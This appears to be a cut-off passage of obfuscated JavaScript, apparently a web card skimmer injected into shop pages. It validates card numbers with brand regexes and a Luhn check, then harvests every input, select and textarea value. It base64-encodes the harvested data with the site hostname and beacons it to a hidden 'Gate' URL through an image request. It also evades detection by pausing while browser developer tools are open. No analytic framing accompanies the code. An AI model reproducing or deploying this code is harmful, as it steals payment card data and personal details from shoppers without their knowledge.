_0x556d68=_0xf0c6['cmbDEw'][_0x2d158c];if(_0x556d68===undefined){_0x228c42=_0xf0c6['CCgSRX'](_0x228c42);_0xf0c6['cmbDEw'][_0x2d158c]=_0x228c42;}else{_0x228c42=_0x556d68;}return _0x228c42;};function _0x75c9d6(_0xb553b1,_0x26eff7,_0x35748f){return _0xb553b1['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x26eff7,'\x67'),_0x35748f);}function _0x5db1af(_0x2df8e6){var _0x290299=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x330408=/^(?:5[1-5][0-9]{14})$/;var _0x2d3e84=/^(?:3[47][0-9]{13})$/;var _0x75d3e4=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x2af43f=![];if(_0x290299[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x330408[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x2d3e84[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}else if(_0x75d3e4[_0xf0c6('0x0')](_0x2df8e6)){_0x2af43f=!![];}return _0x2af43f;}function _0x16fc6d(_0x451375){if(/[^0-9-\s]+/[_0xf0c6('0x0')](_0x451375))return![];var _0x4982e1=0x0,_0x151be2=0x0,_0x14701b=![];_0x451375=_0x451375[_0xf0c6('0x1')](/\D/g,'');for(var _0x3526d8=_0x451375['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3526d8>=0x0;_0x3526d8--){var _0x5b8fd2=_0x451375['\x63\x68\x61\x72\x41\x74'](_0x3526d8),_0x151be2=parseInt(_0x5b8fd2,0xa);if(_0x14701b){if((_0x151be2*=0x2)>0x9)_0x151be2-=0x9;}_0x4982e1+=_0x151be2;_0x14701b=!_0x14701b;}return _0x4982e1%0xa==0x0;}(function(){'use strict';const _0x28dcb3={};_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']=![];_0x28dcb3[_0xf0c6('0x2')]=undefined;const _0x54dc52=0xa0;const _0x12fd66=(_0x133cf1,_0x383ebd)=>{window[_0xf0c6('0x3')](new CustomEvent(_0xf0c6('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x133cf1,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x383ebd}}));};setInterval(()=>{const _0x188d88=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0xf0c6('0x5')]>_0x54dc52;const _0x34a9b6=window[_0xf0c6('0x6')]-window[_0xf0c6('0x7')]>_0x54dc52;const _0x2ef8f9=_0x188d88?_0xf0c6('0x8'):_0xf0c6('0x9');if(!(_0x34a9b6&&_0x188d88)&&(window[_0xf0c6('0xa')]&&window[_0xf0c6('0xa')][_0xf0c6('0xb')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0xf0c6('0xb')][_0xf0c6('0xc')]||_0x188d88||_0x34a9b6)){if(!_0x28dcb3[_0xf0c6('0xd')]||_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x2ef8f9){_0x12fd66(!![],_0x2ef8f9);}_0x28dcb3[_0xf0c6('0xd')]=!![];_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x2ef8f9;}else{if(_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']){_0x12fd66(![],undefined);}_0x28dcb3['\x69\x73\x4f\x70\x65\x6e']=![];_0x28dcb3['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0xf0c6('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x28dcb3;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x28dcb3;}}());String[_0xf0c6('0xf')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x3b2cf4=0x0,_0x26b459,_0x1e26e4;if(this[_0xf0c6('0x10')]===0x0)return _0x3b2cf4;for(_0x26b459=0x0;_0x26b459<this[_0xf0c6('0x10')];_0x26b459++){_0x1e26e4=this[_0xf0c6('0x11')](_0x26b459);_0x3b2cf4=(_0x3b2cf4<<0x5)-_0x3b2cf4+_0x1e26e4;_0x3b2cf4|=0x0;}return _0x3b2cf4;};var _0x315d96={};_0x315d96['\x47\x61\x74\x65']=_0xf0c6('0x12');_0x315d96[_0xf0c6('0x13')]={};_0x315d96[_0xf0c6('0x14')]=[];_0x315d96[_0xf0c6('0x15')]=![];_0x315d96[_0xf0c6('0x16')]=function(_0x4cb114){if(_0x4cb114.id!==undefined&&_0x4cb114.id!=''&&_0x4cb114.id!==null&&_0x4cb114.value.length<0x100&&_0x4cb114.value.length>0x0){if(_0x16fc6d(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20',''))&&_0x5db1af(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20','')))_0x315d96.IsValid=!![];_0x315d96.Data[_0x4cb114.id]=_0x4cb114.value;return;}if(_0x4cb114.name!==undefined&&_0x4cb114.name!=''&&_0x4cb114.name!==null&&_0x4cb114.value.length<0x100&&_0x4cb114.value.length>0x0){if(_0x16fc6d(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20',''))&&_0x5db1af(_0x75c9d6(_0x75c9d6(_0x4cb114.value,'\x2d',''),'\x20','')))_0x315d96.IsValid=!![];_0x315d96.Data[_0x4cb114.name]=_0x4cb114.value;return;}};_0x315d96[_0xf0c6('0x17')]=function(){var _0x5ec5c2=document.getElementsByTagName(_0xf0c6('0x18'));var _0x321f89=document.getElementsByTagName(_0xf0c6('0x19'));var _0x446fe2=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x49461b=0x0;_0x49461b<_0x5ec5c2.length;_0x49461b++)_0x315d96.SaveParam(_0x5ec5c2[_0x49461b]);for(var _0x49461b=0x0;_0x49461b<_0x321f89.length;_0x49461b++)_0x315d96.SaveParam(_0x321f89[_0x49461b]);for(var _0x49461b=0x0;_0x49461b<_0x446fe2.length;_0x49461b++)_0x315d96.SaveParam(_0x446fe2[_0x49461b]);};_0x315d96[_0xf0c6('0x1a')]=function(){if(!window.devtools.isOpen&&_0x315d96.IsValid){_0x315d96.Data[_0xf0c6('0x1b')]=location.hostname;var _0x23140f=encodeURIComponent(window.btoa(JSON.stringify(_0x315d96.Data)));var _0x56aac4=_0x23140f.hashCode();for(var _0x48f809=0x0;_0x48f809<_0x315d96.Sent.length;_0x48f809++)if(_0x315d96.Sent[_0x48f809]==_0x56aac4)return;_0x315d96.LoadImage(_0x23140f);}};_0x315d96[_0xf0c6('0x1c')]=function(){_0x315d96.SaveAllFields();_0x315d96.SendData();};_0x315d96[_0xf0c6('0x1d')]=function(_0x102c7d){_0x315d96.Sent.push(_0x102c7d.hashCode());var _0x28354e=document.createElement(_0xf0c6('0x1e'));_0x28354e.src=_0x315d96.GetImageUrl(_0x102c7d);};_0x315d96[_0xf0c6('0x1f')]=function(_0xb64897){return _0x315d96.Gate+_0xf0c6('0x20')+_0xb64897;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0xf0c6('0x21')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0xf0c6('0x22')](_0x315d96['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};